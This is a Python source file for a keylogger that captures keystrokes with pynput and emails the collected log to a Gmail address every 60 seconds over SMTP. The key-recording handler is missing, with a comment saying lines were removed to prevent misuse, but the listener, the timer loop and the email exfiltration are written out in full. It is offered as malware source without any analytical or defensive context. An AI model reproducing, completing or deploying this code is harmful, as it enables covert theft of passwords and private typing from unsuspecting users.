import smtplib
import threading
from pynput import keyboard

class KeyLogger:
    def __init__(self, time_interval: int, email: str, password: str) -> None:
        self.interval = time_interval
        self.log = "KeyLogger has started...\n"
        self.email = email
        self.password = "generated_application_password_from_gmail_account"


    # *some lines of code have been erased due to prevention of misuse'

    def send_mail(self, message):
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {str(e)}")

    def report_n_send(self):
        self.send_mail("\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()

if __name__ == "__main__":
    email_address = "your_mail"  # Replace with your Gmail address
    email_password = "your_password"        # Replace with your Gmail password
    interval = 60  # Set the time interval (in seconds) for sending logs via email
    
    keylogger = KeyLogger(interval, email_address, email_password)
    keylogger.start()
